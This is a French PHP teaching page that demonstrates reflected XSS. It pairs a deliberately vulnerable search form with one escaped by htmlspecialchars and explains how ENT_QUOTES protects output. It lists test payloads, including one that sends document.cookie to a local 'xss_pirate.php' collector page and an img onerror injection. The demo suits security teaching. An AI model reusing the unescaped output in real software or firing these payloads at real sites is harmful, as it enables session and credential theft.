<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="utf-8" />
        <script>
            document.cookie = 'login=my_login;'
            document.cookie = 'motdepasse=my_secret_password;'
        </script>    
    </head>
    <body>
        <h1>La faille XSS : Cross-site scripting</h1>
        <h2>X = cross, pour ne pas confondre avec CSS</h2>
        <p>
            <a href="https://zestedesavoir.com/articles/232/les-failles-xss/" target="_blank">Explications de la démo</a>
        </p>
        <p>
            <a href="https://fr.wikipedia.org/wiki/Cross-site_scripting" target="_blank">Wikipedia</a>
        </p>

        <?php
        if(isset($_POST['keyword']) && !empty($_POST['keyword']))
        {
            echo '<h2>Site non sécurisé</h2>';
            echo "Résultat(s) pour le mot-clé : ".$_POST['keyword'];
        } 

        if(isset($_POST['keyword2']) && !empty($_POST['keyword2']))
        {
            echo '<h2>Site sécurisé</h2>';
            $_POST['keyword2'] = htmlspecialchars($_POST['keyword2'], ENT_QUOTES);
            echo "Résultat(s) pour le mot-clé : ".$_POST['keyword2'];
        } 
?>

        <h2>Non sécurisé</h1>
        <form method="post" action="">
            <input type="text" name="keyword" />
            <input type="submit" value="Rechercher" />
        </form>

        <h2>Sécurisé</h1>
        <form method="post" action="">
            <input type="text" name="keyword2" />
            <input type="submit" value="Rechercher" />
        </form>

        <h2>Les tests à dérouler</h1>
        <p>Test 1 : Coucou</p>
        <p>Test 2 : <?= htmlentities('<h1>Coucou</h1>') ?></p>
        <p>Test 3 : <?= htmlentities('<script>alert("Coucou la faille XSS ?");</script>') ?></p>
        <p>Test 4 : <?= htmlentities('<script>alert("Cookies = " + document.cookie);</script>') ?></p>
        <p>Test 5 : <?= htmlentities('<script>console.log("Cookies = " + document.cookie);</script>') ?></p>
        <p>Test 6 : <?= htmlentities('<script>window.location.replace("http://localhost/formation/afpa/securite/xss_pirate.php?cookies=" + document.cookie);</script>') ?></p>
        <p>Test 7 : <?= htmlentities('<img src="aaaaa" onerror="alert(\'Idem sans balise script\');">') ?></p>


        <h2>Protection en PHP : htmlentities ou htmlspecialchars</h1>
        <p>
            htmlentities encode tous les caractères spéciaux (< > "…) mais aussi les é è à ù… alors que htmlspecialchars se contente des caractères spéciaux ce qui suppose donc que vous utilisez un charset supportant les caractères comme é è à ù sinon vous aurez probablement des � à la place.
        </p>
        <p>
            Le paramètre ENT_QUOTES est ajouté à la fonction htmlentities ou htmlspecialchars pour préciser d'échapper également les simples guillemets car cela peut être problématique, notamment si, par exemple, vous utilisez la chaîne vulnérable dans un attribut d'une balise HTML qui est sous la forme attribut='valeur' : le simple guillemet n'étant pas échappé, il est donc encore possible de fermer cet attribut. Le ENT_QUOTES empêchera cela.
        </p>
    </body>
</html>